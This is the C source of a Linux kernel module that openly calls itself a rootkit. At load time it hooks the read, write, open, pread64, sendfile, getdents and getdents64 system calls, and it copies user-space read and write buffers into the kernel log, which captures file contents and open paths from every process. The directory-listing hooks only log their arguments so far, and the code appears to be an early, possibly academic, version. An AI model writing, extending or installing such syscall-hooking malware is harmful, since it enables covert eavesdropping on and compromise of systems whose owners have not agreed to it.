#include "rootkit-main.h"

#include "hooking.h"
#include "macro-utils.h"
#include <linux/dirent.h>
#include <linux/ioctl.h>
#include <linux/limits.h>
#include <linux/linkage.h>
#include <linux/miscdevice.h>
#include <linux/mm.h>
#include <linux/module.h>
#include <linux/printk.h>
#include <linux/slab.h>
#include <linux/types.h>
#include <linux/uaccess.h>


MODULE_LICENSE("GPL");
MODULE_AUTHOR("[AUTHOR 1], [AUTHOR 2], [AUTHOR 3], [AUTHOR 4]");
MODULE_DESCRIPTION("A Linux kernel rootkit");
MODULE_VERSION("0.1");

static sysfun_t p_orig_sysfuns[__NR_syscalls] = { NULL };

static hook_t p_syscall_hooks[] =
    SYSCALL_HOOKS(read, write, open, pread64, sendfile, getdents, getdents64);

static int __init rootkit_init(void)
{
    int i_err;

    // Initialize hooking
    i_err = init_hooking();

    if (i_err) {
        pr_err("[ROOTKIT] Failed to initialize hooking");
        return i_err;
    }

    hook_syscalls(p_syscall_hooks, ARRAY_SIZE(p_syscall_hooks));

    pr_info("[ROOTKIT] Module loaded");
    return 0;
}

static __exit void rootkit_exit(void)
{
    // Restore original syscall functions
    unhook_syscalls(p_syscall_hooks, ARRAY_SIZE(p_syscall_hooks));

    pr_info("[ROOTKIT] Module unloaded");
    return;
}

SYSCALL_HOOK_HANDLER3(read, orig_read, p_regs, unsigned int, ui32_fd, char __user *, s_buf, size_t,
                      sz_count)
{
    long l_err;
    long l_ret;
    char *s_data;

    pr_info("[ROOTKIT] read(%u, %p, %zu)", ui32_fd, s_buf, sz_count);

    l_ret = orig_read(p_regs);

    s_data = (char *)kvmalloc(sz_count + 1, GFP_KERNEL);

    if (s_data == NULL) {
        pr_err("[ROOTKIT] * Could not allocate memory");
    } else {
        l_err = strncpy_from_user(s_data, s_buf, sz_count + 1);

        if (l_err < 0) {
            pr_err("[ROOTKIT] * Could not copy data from user");
        } else {
            pr_info("[ROOTKIT] * Data read: %.*s", (int)sz_count, s_data);
        }

        kvfree(s_data);
    }

    return l_ret;
}

SYSCALL_HOOK_HANDLER3(write, orig_write, p_regs, unsigned int, ui32_fd, const char __user *, s_buf,
                      size_t, sz_count)
{
    long l_err;
    char *s_data;

    pr_info("[ROOTKIT] write(%u, %p, %zu)", ui32_fd, s_buf, sz_count);

    s_data = (char *)kvmalloc(sz_count + 1, GFP_KERNEL);

    if (s_data == NULL) {
        pr_err("[ROOTKIT] * Could not allocate memory");
    } else {
        l_err = strncpy_from_user(s_data, s_buf, sz_count + 1);

        if (l_err < 0) {
            pr_err("[ROOTKIT] * Could not copy data from user");
        } else {
            pr_info("[ROOTKIT] * Data to write: %.*s", (int)sz_count, s_data);
        }

        kvfree(s_data);
    }

    return orig_write(p_regs);
}

SYSCALL_HOOK_HANDLER3(open, orig_open, p_regs, const char __user *, s_filename, int, i32_flags,
                      umode_t, ui16_mode)
{
    long l_err;
    char *s_filename_k;

    s_filename_k = (char *)kvmalloc(PATH_MAX, GFP_KERNEL);

    if (s_filename_k == NULL) {
        pr_err("[ROOTKIT] * Could not allocate memory");
    } else {
        l_err = strncpy_from_user(s_filename_k, s_filename, PATH_MAX);

        if (l_err < 0) {
            pr_err("[ROOTKIT] * Could not copy filename from user");
            strncpy(s_filename_k, "(unknown)", PATH_MAX);
        }

        pr_info("[ROOTKIT] open(\"%s\", %#x, 0%ho)", s_filename_k, i32_flags, ui16_mode);

        kvfree(s_filename_k);
    }

    return orig_open(p_regs);
}

SYSCALL_HOOK_HANDLER4(pread64, orig_pread64, p_regs, unsigned int, ui32_fd, char __user *, s_buf,
                      size_t, sz_count, loff_t, i64_pos)
{
    long l_err;
    long l_ret;
    char *s_data;

    pr_info("[ROOTKIT] pread64(%u, %p, %zu, %lld)", ui32_fd, s_buf, sz_count, i64_pos);

    l_ret = orig_pread64(p_regs);

    s_data = (char *)kvmalloc(sz_count + 1, GFP_KERNEL);

    if (s_data == NULL) {
        pr_err("[ROOTKIT] * Could not allocate memory");
    } else {
        l_err = strncpy_from_user(s_data, s_buf, sz_count + 1);

        if (l_err < 0) {
            pr_err("[ROOTKIT] * Could not copy data from user");
        } else {
            pr_info("[ROOTKIT] * Data read: %.*s", (int)sz_count, s_data);
        }

        kvfree(s_data);
    }

    return l_ret;
}

SYSCALL_HOOK_HANDLER4(sendfile, orig_sendfile, p_regs, int, i32_out_fd, int, i32_in_fd,
                      loff_t __user *, p_offset, size_t, sz_count)
{
    pr_info("[ROOTKIT] sendfile(%d, %d, %p, %zu)", i32_out_fd, i32_in_fd, p_offset, sz_count);

    return orig_sendfile(p_regs);
}

SYSCALL_HOOK_HANDLER3(getdents, orig_getdents, p_regs, unsigned int, ui32_fd,
                      struct linux_dirent __user *, p_dirent, unsigned int, ui32_count)
{
    pr_info("[ROOTKIT] getdents(%u, %p, %u)", ui32_fd, p_dirent, ui32_count);

    return orig_getdents(p_regs);
}

SYSCALL_HOOK_HANDLER3(getdents64, orig_getdents64, p_regs, unsigned int, ui32_fd,
                      struct linux_dirent64 __user *, p_dirent, unsigned int, ui32_count)
{
    pr_info("[ROOTKIT] getdents64(%u, %p, %u)", ui32_fd, p_dirent, ui32_count);

    return orig_getdents64(p_regs);
}

module_init(rootkit_init);
module_exit(rootkit_exit);
